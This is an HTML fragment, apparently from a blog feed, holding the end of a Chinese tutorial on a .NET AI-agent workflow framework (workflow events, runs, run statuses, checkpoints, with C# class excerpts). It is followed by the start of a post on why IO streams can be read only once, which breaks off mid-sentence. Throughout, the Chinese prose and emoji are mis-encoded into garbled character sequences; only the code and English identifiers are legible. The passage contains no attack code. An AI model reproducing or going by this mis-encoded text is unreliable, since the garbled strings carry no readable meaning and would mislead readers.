WorkflowEventï¼Ÿ</h2>\n<p><strong>WorkflowEventï¼ˆå·¥ä½œæµäº‹ä»¶ï¼‰</strong> æ˜¯å·¥ä½œæµæ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„<strong>é€šçŸ¥æ¶ˆæ¯</strong>ï¼Œç±»ä¼¼äºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»æ¯”</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ“¢ å¹¿æ’­é€šçŸ¥</td>\n<td>å‘æ‰€æœ‰äººå¹¿æ’­ç³»ç»ŸçŠ¶æ€å˜åŒ–</td>\n</tr>\n<tr>\n<td>ğŸ“ æ—¥å¿—è®°å½•</td>\n<td>è®°å½•ç³»ç»Ÿæ‰§è¡Œè¿‡ç¨‹ä¸­çš„å…³é”®èŠ‚ç‚¹</td>\n</tr>\n<tr>\n<td>ğŸ”” äº‹ä»¶è®¢é˜…</td>\n<td>å…è®¸å¤–éƒ¨ç›‘å¬å¹¶å“åº”ç‰¹å®šäº‹ä»¶</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/e0cdfd71-e011-48ff-b3e2-c725c33331a9.png\" /></p>\n<h2 id=\"-äº‹ä»¶åˆ†ç±»\">ğŸ“Œ äº‹ä»¶åˆ†ç±»</h2>\n<table>\n<thead>\n<tr>\n<th>äº‹ä»¶å±‚çº§</th>\n<th>äº‹ä»¶ç±»å‹</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>å·¥ä½œæµçº§åˆ«</strong></td>\n<td><code>WorkflowStartedEvent</code></td>\n<td>å·¥ä½œæµå¼€å§‹æ‰§è¡Œ</td>\n</tr>\n<tr>\n<td></td>\n<td><code>WorkflowOutputEvent</code></td>\n<td>å·¥ä½œæµäº§ç”Ÿè¾“å‡º</td>\n</tr>\n<tr>\n<td></td>\n<td><code>WorkflowErrorEvent</code></td>\n<td>å·¥ä½œæµå‘ç”Ÿé”™è¯¯</td>\n</tr>\n<tr>\n<td></td>\n<td><code>WorkflowWarningEvent</code></td>\n<td>å·¥ä½œæµäº§ç”Ÿè­¦å‘Š</td>\n</tr>\n<tr>\n<td><strong>è¶…æ­¥çº§åˆ«</strong></td>\n<td><code>SuperStepStartedEvent</code></td>\n<td>è¶…æ­¥å¼€å§‹</td>\n</tr>\n<tr>\n<td></td>\n<td><code>SuperStepCompletedEvent</code></td>\n<td>è¶…æ­¥å®Œæˆ</td>\n</tr>\n<tr>\n<td><strong>æ‰§è¡Œå™¨çº§åˆ«</strong></td>\n<td><code>ExecutorInvokedEvent</code></td>\n<td>Executor è¢«è°ƒç”¨</td>\n</tr>\n<tr>\n<td></td>\n<td><code>ExecutorCompletedEvent</code></td>\n<td>Executor å®Œæˆå¤„ç†</td>\n</tr>\n<tr>\n<td></td>\n<td><code>ExecutorFailedEvent</code></td>\n<td>Executor å¤„ç†å¤±è´¥</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h1 id=\"ä¸ƒæ ¸å¿ƒæ¦‚å¿µrunè¿è¡Œå®ä¾‹\">ä¸ƒã€æ ¸å¿ƒæ¦‚å¿µï¼šRunï¼ˆè¿è¡Œå®ä¾‹ï¼‰</h1>\n<h2 id=\"-ä»€ä¹ˆæ˜¯-run\">ğŸƒ ä»€ä¹ˆæ˜¯ Runï¼Ÿ</h2>\n<p><strong>Runï¼ˆè¿è¡Œå®ä¾‹ï¼‰</strong> æ˜¯ Workflow çš„<strong>ä¸€æ¬¡å…·ä½“æ‰§è¡Œ</strong>ï¼Œç±»ä¼¼äºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»æ¯”</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ¬ ç”µå½±çš„ä¸€åœºæ”¾æ˜ </td>\n<td>åŒä¸€éƒ¨ç”µå½±å¯ä»¥æ”¾æ˜ å¤šåœº</td>\n</tr>\n<tr>\n<td>ğŸ­ ç”Ÿäº§çº¿çš„ä¸€ä¸ªæ‰¹æ¬¡</td>\n<td>åŒä¸€æ¡ç”Ÿäº§çº¿å¯ä»¥ç”Ÿäº§å¤šä¸ªæ‰¹æ¬¡</td>\n</tr>\n<tr>\n<td>ğŸ® æ¸¸æˆçš„ä¸€å±€</td>\n<td>åŒä¸€ä¸ªæ¸¸æˆå¯ä»¥ç©å¤šå±€</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/0001c522-eed9-4bb7-8944-e9154f479dfe.png\" /></p>\n<h2 id=\"-run-çš„æ ¸å¿ƒç‰¹æ€§\">ğŸ“Œ Run çš„æ ¸å¿ƒç‰¹æ€§</h2>\n<pre><code class=\"language-csharp\">// æ¥è‡ª Run.cs\npublic sealed class Run : IAsyncDisposable\n{\n    // è¿è¡Œå®ä¾‹çš„å”¯ä¸€æ ‡è¯†ç¬¦\n    public string RunId =&gt; this._runHandle.RunId;\n    \n    // è·å–å½“å‰æ‰§è¡ŒçŠ¶æ€\n    public ValueTask&lt;RunStatus&gt; GetStatusAsync(CancellationToken cancellationToken = default);\n    \n    // è·å–æ‰€æœ‰äº§ç”Ÿçš„äº‹ä»¶\n    public IEnumerable&lt;WorkflowEvent&gt; OutgoingEvents =&gt; this._eventSink;\n    \n    // è·å–è‡ªä¸Šæ¬¡è®¿é—®åçš„æ–°äº‹ä»¶\n    public IEnumerable&lt;WorkflowEvent&gt; NewEvents { get; }\n    \n    // æ¢å¤æ‰§è¡Œï¼ˆå¸¦å¤–éƒ¨å“åº”ï¼‰\n    public async ValueTask&lt;bool&gt; ResumeAsync(IEnumerable&lt;ExternalResponse&gt; responses, CancellationToken cancellationToken = default);\n}\n</code></pre>\n<h2 id=\"-runstatusè¿è¡ŒçŠ¶æ€\">ğŸ“Œ RunStatusï¼ˆè¿è¡ŒçŠ¶æ€ï¼‰</h2>\n<pre><code class=\"language-csharp\">public enum RunStatus\n{\n    NotStarted,      // å°šæœªå¼€å§‹\n    Idle,            // ç©ºé—²ï¼ˆå·²æš‚åœï¼Œæ— å¾…å¤„ç†è¯·æ±‚ï¼‰\n    PendingRequests, // ç­‰å¾…å¤–éƒ¨å“åº”\n    Ended,           // å·²ç»“æŸ\n    Running          // æ­£åœ¨è¿è¡Œ\n}\n</code></pre>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/9dd5573f-6e86-4d0f-93e1-01666e988f03.png\" /></p>\n<hr />\n<h1 id=\"å…«æ ¸å¿ƒæ¦‚å¿µcheckpointæ£€æŸ¥ç‚¹\">å…«ã€æ ¸å¿ƒæ¦‚å¿µï¼šCheckpointï¼ˆæ£€æŸ¥ç‚¹ï¼‰</h1>\n<h2 id=\"-ä»€ä¹ˆæ˜¯-checkpoint\">ğŸ’¾ ä»€ä¹ˆæ˜¯ Checkpointï¼Ÿ</h2>\n<p><strong>Checkpointï¼ˆæ£€æŸ¥ç‚¹ï¼‰</strong> æ˜¯å·¥ä½œæµåœ¨æŸä¸ªæ—¶åˆ»çš„<strong>å®Œæ•´çŠ¶æ€å¿«ç…§</strong>ï¼Œç±»ä¼¼äºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»æ¯”</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ® æ¸¸æˆå­˜æ¡£</td>\n<td>ä¿å­˜æ¸¸æˆè¿›åº¦ï¼Œéšæ—¶å¯ä»¥è¯»æ¡£ç»§ç»­</td>\n</tr>\n<tr>\n<td>ğŸ“¸ ç…§ç‰‡</td>\n<td>è®°å½•æŸä¸€æ—¶åˆ»çš„å®Œæ•´çŠ¶æ€</td>\n</tr>\n<tr>\n<td>ğŸ”– ä¹¦ç­¾</td>\n<td>æ ‡è®°é˜…è¯»è¿›åº¦ï¼Œä¸‹æ¬¡ä»è¿™é‡Œç»§ç»­</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/fe1a85bc-369c-4ab7-9817-44e56a910cb2.png\" /></p>\n<h2 id=\"-checkpoint-çš„æ ¸å¿ƒä¿¡æ¯\">ğŸ“Œ Checkpoint çš„æ ¸å¿ƒä¿¡æ¯</h2>\n<pre><code class=\"language-csharp\">// æ¥è‡ª CheckpointInfo.cs\npublic sealed class CheckpointInfo\n{\n    // è¿è¡Œå®ä¾‹çš„å”¯ä¸€æ ‡è¯†ç¬¦\n    public string RunId { get; }\n    \n    // æ£€æŸ¥ç‚¹çš„å”¯ä¸€æ ‡è¯†ç¬¦\n    public string CheckpointId { get; }\n}\n\n// æ£€æŸ¥ç‚¹çš„å®Œæ•´æ•°æ®ï¼ˆæ¥è‡ª Checkpoint.csï¼‰\ninternal sealed class Checkpoint\n{\n    public int StepNumber { get; }                                    // è¶…æ­¥ç¼–å·\n    public WorkflowInfo Workflow { get; }                             // å·¥ä½œæµä¿¡æ¯\n    public RunnerStateData RunnerData { get; }                        // è¿è¡Œå™¨çŠ¶æ€\n    public Dictionary&lt;ScopeKey, PortableValue&gt; StateData { get; }     // çŠ¶æ€æ•°æ®\n    public Dictionary&lt;EdgeId, PortableValue&gt; EdgeStateData { get; }   // è¾¹çŠ¶æ€æ•°æ®\n    public CheckpointInfo? Parent { get; }                            // çˆ¶æ£€æŸ¥ç‚¹\n}\n</code></pre>\n<h2 id=\"-checkpoint-çš„ä½¿ç”¨åœºæ™¯\">ğŸ“Œ Checkpoint çš„ä½¿ç”¨åœºæ™¯</h2>\n<table>\n<thead>\n<tr>\n<th>åœºæ™¯</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>æ•…éšœæ¢å¤</strong></td>\n<td>ç³»ç»Ÿå´©æºƒåä»æœ€è¿‘çš„æ£€æŸ¥ç‚¹æ¢å¤</td>\n</tr>\n<tr>\n<td><strong>é•¿æ—¶é—´è¿è¡Œ</strong></td>\n<td>åˆ†æ®µæ‰§è¡Œï¼Œæ¯æ®µç»“æŸä¿å­˜è¿›åº¦</td>\n</tr>\n<tr>\n<td><strong>äººæœºäº¤äº’</strong></td>\n<td>ç­‰å¾…ç”¨æˆ·è¾“å…¥æ—¶ä¿å­˜çŠ¶æ€</td>\n</tr>\n<tr>\n<td><strong>è°ƒè¯•å›æ”¾</strong></td>\n<td>ä»ä»»æ„æ£€æŸ¥ç‚¹é‡æ–°æ‰§è¡Œ</td>\n</tr>\n<tr>\n<td><strong>ç‰ˆæœ¬åˆ†æ”¯</strong></td>\n<td>ä»åŒä¸€ä¸ªæ£€æŸ¥ç‚¹åˆ›å»ºå¤šä¸ªåˆ†æ”¯æ‰§è¡Œ</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/a738e6f3-a6ed-457d-ac84-5774a33963be.png\" /></p>\n<hr />\n<h1 id=\"ä¹æ ¸å¿ƒæ¦‚å¿µå…³ç³»å›¾\">ä¹ã€æ ¸å¿ƒæ¦‚å¿µå…³ç³»å›¾</h1>\n<h2 id=\"-æ¦‚å¿µä¹‹é—´çš„å…³ç³»\">ğŸ”— æ¦‚å¿µä¹‹é—´çš„å…³ç³»</h2>\n<p>è®©æˆ‘ä»¬æŠŠæ‰€æœ‰æ ¸å¿ƒæ¦‚å¿µè”ç³»èµ·æ¥ï¼Œçœ‹çœ‹å®ƒä»¬æ˜¯å¦‚ä½•åä½œçš„ï¼š</p>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/7f1a8fae-382d-46ac-b410-b4143a4b3080.png\" /></p>\n<h2 id=\"-ç”Ÿå‘½å‘¨æœŸè§†è§’\">ğŸ“Œ ç”Ÿå‘½å‘¨æœŸè§†è§’</h2>\n<p>ä»å·¥ä½œæµçš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸæ¥çœ‹ï¼š</p>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/23190ea8-91bc-4424-8d4e-7831777b4c59.png\" /></p>\n<h2 id=\"-æ¶ˆæ¯æµè§†è§’\">ğŸ“Œ æ¶ˆæ¯æµè§†è§’</h2>\n<p>ä»æ¶ˆæ¯åœ¨å·¥ä½œæµä¸­çš„æµåŠ¨æ¥çœ‹ï¼š</p>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/cb1e4135-d345-461b-bfcc-8da838c2f242.png\" /></p>\n<p><strong>å…³é”®ç†è§£</strong>ï¼š</p>\n<ol>\n<li><strong>æ¶ˆæ¯é©±åŠ¨</strong>ï¼šExecutor ä¹‹é—´é€šè¿‡æ¶ˆæ¯ä¼ é€’æ•°æ®</li>\n<li><strong>å¼‚æ­¥æ‰¹å¤„ç†</strong>ï¼šåŒä¸€ SuperStep å†…çš„ Executor å¯ä»¥å¹¶è¡Œæ‰§è¡Œ</li>\n<li><strong>è¾¹æ§åˆ¶æµå‘</strong>ï¼šEdge å†³å®šæ¶ˆæ¯ä»å“ªé‡Œåˆ°å“ªé‡Œ</li>\n<li><strong>çŠ¶æ€éš”ç¦»</strong>ï¼šæ¯ä¸ª SuperStep ç»“æŸæ—¶åº”ç”¨çŠ¶æ€æ›´æ–°</li>\n</ol>\n<hr />\n<h1 id=\"åå®é™…åº”ç”¨ç¤ºä¾‹\">åã€å®é™…åº”ç”¨ç¤ºä¾‹</h1>\n<h2 id=\"-åœºæ™¯ç”µå•†è®¢å•å¤„ç†å·¥ä½œæµ\">ğŸ›’ åœºæ™¯ï¼šç”µå•†è®¢å•å¤„ç†å·¥ä½œæµ</h2>\n<p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®é™…åœºæ™¯æ¥ç†è§£è¿™äº›æ¦‚å¿µçš„åº”ç”¨ï¼š</p>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/cf7cb742-6088-4658-a99e-b2dff3e886e9.png\" /></p>\n<h2 id=\"-æ¦‚å¿µå¯¹åº”å…³ç³»\">ğŸ“Œ æ¦‚å¿µå¯¹åº”å…³ç³»</h2>\n<table>\n<thead>\n<tr>\n<th>æ¦‚å¿µ</th>\n<th>åœ¨æ­¤åœºæ™¯ä¸­çš„ä½“ç°</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Workflow</strong></td>\n<td>æ•´ä¸ªè®¢å•å¤„ç†æµç¨‹</td>\n</tr>\n<tr>\n<td><strong>Executor</strong></td>\n<td>æ¯ä¸ªå¤„ç†æ­¥éª¤ï¼ˆæ¥æ”¶ã€éªŒè¯ã€æ”¯ä»˜ç­‰ï¼‰</td>\n</tr>\n<tr>\n<td><strong>Edge</strong></td>\n<td>æ­¥éª¤ä¹‹é—´çš„è¿æ¥ï¼ˆå«æ¡ä»¶åˆ¤æ–­ï¼‰</td>\n</tr>\n<tr>\n<td><strong>SuperStep</strong></td>\n<td>æ¯ä¸€è½®å¤„ç†ï¼ˆå¦‚ï¼šè¶…æ­¥1å¤„ç†æ¥æ”¶ï¼Œè¶…æ­¥2å¤„ç†éªŒè¯...ï¼‰</td>\n</tr>\n<tr>\n<td><strong>WorkflowContext</strong></td>\n<td>æä¾›è®¢å•çŠ¶æ€è¯»å†™ã€æ¶ˆæ¯å‘é€èƒ½åŠ›</td>\n</tr>\n<tr>\n<td><strong>WorkflowEvent</strong></td>\n<td>æ¯ä¸ªæ­¥éª¤çš„å¼€å§‹/å®Œæˆ/å¤±è´¥äº‹ä»¶</td>\n</tr>\n<tr>\n<td><strong>Run</strong></td>\n<td>ä¸€ä¸ªå…·ä½“è®¢å•çš„å¤„ç†è¿‡ç¨‹</td>\n</tr>\n<tr>\n<td><strong>Checkpoint</strong></td>\n<td>å¤„ç†ä¸­é€”ä¿å­˜çš„çŠ¶æ€ï¼ˆå¦‚æ”¯ä»˜å®Œæˆåä¿å­˜ï¼‰</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-åœºæ™¯å¤šæ™ºèƒ½ä½“åä½œå·¥ä½œæµ\">ğŸ¤– åœºæ™¯ï¼šå¤šæ™ºèƒ½ä½“åä½œå·¥ä½œæµ</h2>\n<p>åœ¨ AI Agent åœºæ™¯ä¸­ï¼ŒWorkflow å¯ä»¥ç”¨æ¥ç¼–æ’å¤šä¸ª Agent çš„åä½œï¼š</p>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/22fb1f31-f863-44ad-97f0-69ab7fae6afc.png\" /></p>\n<p><strong>Workflow çš„ä¼˜åŠ¿</strong>ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ä¼˜åŠ¿</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ”„ <strong>çµæ´»ç¼–æ’</strong></td>\n<td>å¯ä»¥è½»æ¾è°ƒæ•´ Agent ä¹‹é—´çš„åä½œå…³ç³»</td>\n</tr>\n<tr>\n<td>ğŸ’¾ <strong>çŠ¶æ€ç®¡ç†</strong></td>\n<td>è‡ªåŠ¨ç®¡ç†å„ Agent çš„çŠ¶æ€å’Œä¸Šä¸‹æ–‡</td>\n</tr>\n<tr>\n<td>â¸ï¸ <strong>å¯ä¸­æ–­/æ¢å¤</strong></td>\n<td>æ”¯æŒäººæœºäº¤äº’ï¼Œéšæ—¶æš‚åœå’Œæ¢å¤</td>\n</tr>\n<tr>\n<td>ğŸ” <strong>å¯è§‚æµ‹æ€§</strong></td>\n<td>é€šè¿‡äº‹ä»¶è¿½è¸ªæ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹</td>\n</tr>\n<tr>\n<td>ğŸ›¡ï¸ <strong>å®¹é”™èƒ½åŠ›</strong></td>\n<td>é€šè¿‡æ£€æŸ¥ç‚¹æ”¯æŒæ•…éšœæ¢å¤</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h1 id=\"åä¸€æ¦‚å¿µæ€»ç»“\">åä¸€ã€æ¦‚å¿µæ€»ç»“</h1>\n<h2 id=\"-æ ¸å¿ƒæ¦‚å¿µé€ŸæŸ¥è¡¨\">ğŸ“š æ ¸å¿ƒæ¦‚å¿µé€ŸæŸ¥è¡¨</h2>\n<table>\n<thead>\n<tr>\n<th>æ¦‚å¿µ</th>\n<th>å®šä¹‰</th>\n<th>å…³é”®ç±»</th>\n<th>æ ¸å¿ƒèŒè´£</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Executor</strong></td>\n<td>æ‰§è¡Œå™¨/å¤„ç†èŠ‚ç‚¹</td>\n<td><code>Executor</code>, <code>Executor&lt;T&gt;</code>, <code>FunctionExecutor&lt;T&gt;</code></td>\n<td>å¤„ç†æ¶ˆæ¯ï¼Œäº§ç”Ÿè¾“å‡º</td>\n</tr>\n<tr>\n<td><strong>Edge</strong></td>\n<td>è¿æ¥è¾¹</td>\n<td><code>Edge</code>, <code>EdgeData</code>, <code>DirectEdgeData</code></td>\n<td>å®šä¹‰æ¶ˆæ¯æµå‘å’Œæ¡ä»¶</td>\n</tr>\n<tr>\n<td><strong>Workflow</strong></td>\n<td>å·¥ä½œæµå®šä¹‰</td>\n<td><code>Workflow</code>, <code>WorkflowBuilder</code></td>\n<td>ç»„ç»‡ Executor å’Œ Edge</td>\n</tr>\n<tr>\n<td><strong>SuperStep</strong></td>\n<td>è¶…æ­¥/æ‰¹é‡å¤„ç†å‘¨æœŸ</td>\n<td><code>SuperStepEvent</code>, <code>SuperStepStartedEvent</code></td>\n<td>æ‰¹é‡å¤„ç†æ¶ˆæ¯</td>\n</tr>\n<tr>\n<td><strong>WorkflowContext</strong></td>\n<td>å·¥ä½œæµä¸Šä¸‹æ–‡</td>\n<td><code>IWorkflowContext</code></td>\n<td>æä¾›è¿è¡Œæ—¶æœåŠ¡</td>\n</tr>\n<tr>\n<td><strong>WorkflowEvent</strong></td>\n<td>å·¥ä½œæµäº‹ä»¶</td>\n<td><code>WorkflowEvent</code>, <code>ExecutorEvent</code></td>\n<td>é€šçŸ¥æ‰§è¡ŒçŠ¶æ€</td>\n</tr>\n<tr>\n<td><strong>Run</strong></td>\n<td>è¿è¡Œå®ä¾‹</td>\n<td><code>Run</code>, <code>RunStatus</code></td>\n<td>ç®¡ç†ä¸€æ¬¡æ‰§è¡Œ</td>\n</tr>\n<tr>\n<td><strong>Checkpoint</strong></td>\n<td>æ£€æŸ¥ç‚¹</td>\n<td><code>CheckpointInfo</code>, <code>ICheckpointStore</code></td>\n<td>ä¿å­˜å’Œæ¢å¤çŠ¶æ€</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-è®°å¿†å£è¯€\">ğŸ“Œ è®°å¿†å£è¯€</h2>\n<blockquote>\n<p><strong>\"å·¥ä½œæµç¨‹è¾¹è¿æ¥ï¼Œæ‰§è¡Œå™¨æ¥åšå¤„ç†\"</strong><br />\n<strong>\"è¶…æ­¥æ‰¹é‡å¾€å‰èµ°ï¼Œä¸Šä¸‹æ–‡ä¸­è¯»å†™æ€\"</strong><br />\n<strong>\"äº‹ä»¶é€šçŸ¥å…¨è¿‡ç¨‹ï¼Œè¿è¡Œå®ä¾‹è·‘ä¸€æ¬¡\"</strong><br />\n<strong>\"æ£€æŸ¥ç‚¹æ¥å­˜è¿›åº¦ï¼Œéšæ—¶æ¢å¤ä¸æ€•æŒ‚\"</strong></p>\n</blockquote>\n\n</div>\n<div id=\"MySignature\">\n    <div style=\"display: block; border: 2px solid #6ecaa8; padding: 10px;\">  \n<img src=\"https://files.cnblogs.com/files/sheng-jie/maf-course-card-scan.bmp\" />\n<blockquote>\n<b>ğŸ‘†é¢å‘.NETå¼€å‘è€…çš„AI Agent å¼€å‘è¯¾ç¨‹ã€.NET+AI | æ™ºèƒ½ä½“å¼€å‘è¿›é˜¶ã€‘å·²ä¸Šçº¿ï¼Œæ¬¢è¿æ‰«ç åŠ å…¥å­¦ä¹ ã€‚ğŸ‘†</b>\n</blockquote>\n</div>\n\n<img src=\"https://files.cnblogs.com/files/sheng-jie/scan-follow.bmp\" />\n<blockquote>\n<b>\nå…³æ³¨æˆ‘çš„å…¬ä¼—å·ã€å‘ AI è€Œè¡Œã€ï¼Œæˆ‘ä»¬å¾®ä¿¡ä¸è§ä¸æ•£ã€‚\n<br />\né˜…ç½¢æ­¤æ–‡ï¼Œå¦‚æœæ‚¨è§‰å¾—æœ¬æ–‡ä¸é”™å¹¶æœ‰æ‰€æ”¶è·ï¼Œè¯·ã€æ‰“èµã€‘æˆ–ã€æ¨èã€‘ï¼Œä¹Ÿå¯ã€è¯„è®ºã€‘ç•™ä¸‹æ‚¨çš„é—®é¢˜æˆ–å»ºè®®ä¸æˆ‘äº¤æµã€‚\n\nä½ çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­åˆ›ä½œå’Œåˆ†äº«çš„ä¸ç«­åŠ¨åŠ›ï¼</b>\n</blockquote>\n\n<div id=\"AllanboltSignature\" style=\"display: block; border: 2px solid #6ecaa8; padding: 10px;\">    \n        <div>ä½œè€…ï¼š<a href=\"http://www.jianshu.com/u/39ec0e6b1844\" target=\"_blank\">ã€åœ£æ°ã€</a></div>\n        <div>å‡ºå¤„ï¼š<a href=\"http://www.cnblogs.com/sheng-jie/\" target=\"_blank\">http://www.cnblogs.com/sheng-jie/</a></div>\n        <div>æœ¬æ–‡ç‰ˆæƒå½’ä½œè€…å’Œåšå®¢å›­å…±æœ‰ï¼Œæ¬¢è¿è½¬è½½ï¼Œä½†æœªç»ä½œè€…åŒæ„å¿…é¡»ä¿ç•™æ­¤æ®µå£°æ˜ï¼Œä¸”åœ¨æ–‡ç« é¡µé¢æ˜æ˜¾ä½ç½®ç»™å‡ºåŸæ–‡é“¾æ¥ï¼Œå¦åˆ™ä¿ç•™è¿½ç©¶æ³•å¾‹è´£ä»»çš„æƒåˆ©ã€‚</div>  \n</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 20:34</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sheng-jie\">ã€Œåœ£æ°ã€</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">0</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "ä¸ºä»€ä¹ˆ IO æµé€šå¸¸åªèƒ½è¢«è¯»å–ä¸€æ¬¡",
      "link": "https://www.cnblogs.com/yanshajiuzhou/p/19508716",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/yanshajiuzhou/p/19508716\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 20:22\">\n    <span>ä¸ºä»€ä¹ˆ IO æµé€šå¸¸åªèƒ½è¢«è¯»å–ä¸€æ¬¡</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        IO æµåªèƒ½è¯»å–ä¸€æ¬¡ï¼Œæ˜¯ ç²¾å¿ƒè®¾è®¡çš„ï¼Œè´´åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶ / ç½‘ç»œ IO çš„ \"é¡ºåºæ¶ˆè´¹\"&nbsp;ç‰¹æ€§ï¼Œä¿æŒå’Œåº•å±‚ç³»ç»Ÿçš„ä¸€è‡´æ€§ã€‚\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p>ä»Šå¤©æˆ‘ä»¬æ¥ä¸€èµ·æ¢è®¨ä¸‹&nbsp;ä¸ºä»€ä¹ˆ<strong> IO æµ</strong>é€šå¸¸åªèƒ½è¢«è¯»å–ä¸€æ¬¡ï¼Ÿ</p>\n<p>æˆ‘ä¸ºä»€ä¹ˆä¼šå‘å‡ºè¿™ä¸ªç–‘é—®å‘¢ï¼Ÿæ˜¯å› ä¸ºæˆ‘ç ”ç©¶Webå¼€å‘ä¸­çš„ä¸€ä¸ªé—®é¢˜æ—¶ï¼ŒHTTPè¯·æ±‚ä½“åœ¨ <strong>Filterï¼ˆè¿‡æ»¤å™¨ï¼‰</strong>å¤„è¢«è¯»å–äº†ä¹‹åï¼Œåœ¨ Controllerï¼ˆæ§åˆ¶å±‚ï¼‰å°±è¯»ä¸åˆ°å€¼äº†ï¼Œä½¿ç”¨ @RequestBody çš„æ—¶å€™ã€‚</p>\n<p>æ— è®ºæ˜¯å­—èŠ‚æµï¼ˆInputStream / OutputStreamï¼‰è¿˜æ˜¯å­—ç¬¦æµï¼ˆReader / Writerï¼‰ï¼Œæ‰€æœ‰åŸºäºæµçš„è¯»å–æ“ä½œéƒ½ä¼šç»´æŠ¤ä¸€ä¸ª <strong>\"ä½ç½®æŒ‡é’ˆ\"</strong>ã€‚</p>\n<ul>\n<li>åˆå§‹çŠ¶æ€ä¸‹ï¼ŒæŒ‡é’ˆæŒ‡å‘æµçš„èµ·å§‹ä½ç½®<strong>ï¼ˆposition = 0ï¼‰</strong>ï¼›</li>\n<li>æ¯æ¬¡è°ƒç”¨ <strong>read() / read(byte[]) / read(char[])</strong> ç­‰è¯»å–æ–¹æ³•æ—¶ï¼ŒæŒ‡é’ˆä¼šå‘åç§»åŠ¨å¯¹åº”å­—èŠ‚æ•°ï¼›</li>\n<li>å½“æŒ‡é’ˆç§»åŠ¨åˆ°æµçš„æœ«å°¾ï¼ˆæ²¡æœ‰æ›´å¤šæ•°æ®ï¼‰ï¼Œread() æ–¹æ³•ä¼šè¿”å› <strong>-1</strong>ï¼Œè¡¨ç¤ºæµè¯»å–å®Œæ¯•ï¼›</li>\n<li>æŒ‡é’ˆç§»åŠ¨åä¸ä¼šè‡ªåŠ¨å›é€€ï¼Œä¹Ÿæ— æ³•åå‘ç§»åŠ¨ï¼ˆé™¤éæµæ˜¾å¼æ”¯æŒé‡ç½®ï¼‰ï¼Œå› æ­¤å†æ¬¡è¯»å–åªèƒ½å¾—åˆ° <strong>-1</strong>ã€‚</li>\n</ul>\n<p><strong>ç±»æ¯”</strong>ï¼š<strong>IO æµ</strong>çš„è¯»å–è¿‡ç¨‹ï¼Œå°±åƒç”¨ <strong>ç£å¸¦æ’­æ”¾å™¨å¬ç£å¸¦</strong> â€”â€” ç£å¤´ï¼ˆå¯¹åº”æµçš„ä½ç½®æŒ‡é’ˆï¼‰ä»ç£å¸¦å¼€å¤´ï¼ˆæŒ‡é’ˆ 0ï¼‰å¼€å§‹ç§»åŠ¨ï¼Œæ¯è¯»ä¸€ä¸ªå­—èŠ‚ / å­—ç¬¦ï¼Œç£å¤´å°±å¾€åèµ°ä¸€æ­¥ï¼›å½“ç£å¤´èµ°åˆ°ç£å¸¦æœ«å°¾ï¼Œå†ç»§ç»­æ’­æ”¾ï¼ˆè¯»å–ï¼‰å°±åªèƒ½å¬åˆ° \"æ²™æ²™å£°\"ï¼ˆæµè¿”å› <strong>-1</strong>ï¼‰ï¼Œå¹¶ä¸”ç£å¤´ä¸ä¼šè‡ªåŠ¨å›åˆ°å¼€å¤´ã€‚</p>\n<p>å½“ç„¶ï¼Œ<strong>ä¸æ˜¯æ‰€æœ‰æµéƒ½åªèƒ½è¯»ä¸€æ¬¡</strong>ï¼Œ<strong>åŸºäºå†…å­˜çš„æµ</strong>ï¼ˆå¦‚ <strong>ByteArrayInputStream / CharArrayReader</strong>ï¼‰æ”¯æŒé‡ç½®æŒ‡é’ˆï¼Œå› 